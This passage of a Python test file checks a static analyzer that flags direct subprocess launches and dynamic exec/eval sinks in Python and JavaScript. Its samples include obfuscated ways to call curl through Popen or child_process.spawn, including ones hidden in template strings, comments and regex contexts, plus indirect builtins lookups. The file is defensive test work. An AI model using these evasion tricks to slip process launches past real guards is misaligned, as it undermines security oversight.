        'import builtins, subprocess\nbuiltins.getattr(subprocess, "Popen")(["curl"])\n',
        'import builtins as b, subprocess\nget = b.getattr\nget(subprocess, "Popen")(["curl"])\n',
        'cmd = ["/trusted/tool"]\ncmd = ["curl"]\nimport subprocess\nsubprocess.run(cmd)\n',
        'cmd = ["curl"]\ncmd = obtain()\nimport subprocess\nsubprocess.run(cmd)\n',
        'cmd = ["curl"]\ncmd += suffix\nimport subprocess\nsubprocess.run(cmd)\n',
        'cmd = other = ["curl"]\nimport subprocess\nsubprocess.run(cmd)\n',
        'cmd, other = ["curl"], 1\nimport subprocess\nsubprocess.run(cmd)\n',
        'cmd: list[str] = ["curl"]\nimport subprocess\nsubprocess.run(cmd)\n',
        '(cmd := ["curl"])\nimport subprocess\nsubprocess.run(cmd)\n',
        'import builtins\nbuiltins.__dict__["exec"]("pass")\n',
        'globals()["__builtins__"]["eval"]("1")\n',
        'import builtins\ngetattr(builtins, "compile")("1", "x", "eval")\n',
        'import builtins\nbuiltins.__dict__[sink]("pass")\n',
    )
    for source in positives:
        assert direct_dispatch_violations(path, source), source
    controls = (
        'note = "builtins.__dict__[\\"exec\\"]()"\n',
        'registry = {"exec": lambda value: value}\nregistry["exec"]("safe")\n',
        'class Local:\n    getattr = staticmethod(lambda owner, name: lambda value: value)\nLocal.getattr(object(), "compile")("safe")\n',
    )
    for source in controls:
        assert direct_dispatch_violations(path, source) == [], source


def test_r61_discovery_includes_new_dynamic_sink_only_files():
    probes = ((".py", 'import builtins\nbuiltins.__dict__["exec"]("pass")\n'),
              (".js", 'globalThis["eval"]("pass")\n'))
    for suffix, source in probes:
        with tempfile.NamedTemporaryFile(mode="w", suffix=suffix, prefix="dispatch-r61-", dir=ROOT / "scripts", encoding="utf-8") as probe:
            probe.write(source); probe.flush()
            assert Path(probe.name) in discovered_dispatch_consumers((Path(probe.name),))


def test_r62_javascript_template_comments_and_slash_contexts_fail_closed():
    path = ROOT / "probe.js"
    positives = (
        'const value = `x ${1 // keep substitution active\n + require("child_process").spawn("curl")} y`;',
        'const value = `x ${1 /* keep depth */ + require("child_process").spawn("curl")} y`;',
        'let a = {} / require("child_process").spawn("curl") / 1;',
        'for (const item of /`/.exec(value)) {}\nrequire("child_process").spawn("curl")',
        'if (y) /q/* require("child_process").spawn("curl") */z/;',
    )
    for source in positives:
        assert direct_dispatch_violations(path, source), source
    controls = (
        'const text = `require("child_process").spawn("curl") // inert`;',
        'const text = "require(\\"child_process\\").spawn(\\"curl\\")";',
        r'const pattern = /require\("child_process"\)\.spawn\("curl"\)/;',
        'const fake = { spawn(value) { return value; } }; fake.spawn("curl");',
    )
    for source in controls:
        assert direct_dispatch_violations(path, source) == [], source


def test_r62_python_source_order_scopes_dynamic_sinks_and_tainted_launchers():
    path = ROOT / "probe.py"
    positives = (
        'import builtins\nvars(builtins)["exec"]("pass")\n',
        'import builtins as b\nvars(b)["eval"]("1")\n',
        'import builtins\nvars(builtins)[sink]("pass")\n',
        'cmd = ["/trusted/tool"]\nif flag:\n    cmd = ["curl"]\nimport subprocess\nsubprocess.run(cmd)\n',
        'launch = run_bounded\nlaunch = replacement\nlaunch(["git", "status"])\n',
        'launch = replacement\nif flag:\n    launch = run_bounded\nlaunch(["git", "status"])\n',
    )
    for source in positives:
        assert direct_dispatch_violations(path, source), source
    nested_control = (
        'cmd = ["/trusted/tool"]\n'
        'def inner():\n    cmd = ["curl"]\n'
        'import subprocess\nsubprocess.run(cmd)\n'
    )
    outer_only = 'cmd = ["/trusted/tool"]\nimport subprocess\nsubprocess.run(cmd)\n'
    assert [item.split(":", 1)[0] for item in direct_dispatch_violations(path, nested_control)] == [
        item.split(":", 1)[0] for item in direct_dispatch_violations(path, outer_only)
    ]


def test_r62_discovery_includes_vars_sink_only_files():
    with tempfile.NamedTemporaryFile(
        mode="w", suffix=".py", prefix="dispatch-r62-", dir=ROOT / "scripts", encoding="utf-8"
    ) as probe:
        probe.write('import builtins\nvars(builtins)["compile"]("1", "x", "eval")\n'); probe.flush()
        assert Path(probe.name) in discovered_dispatch_consumers((Path(probe.name),))
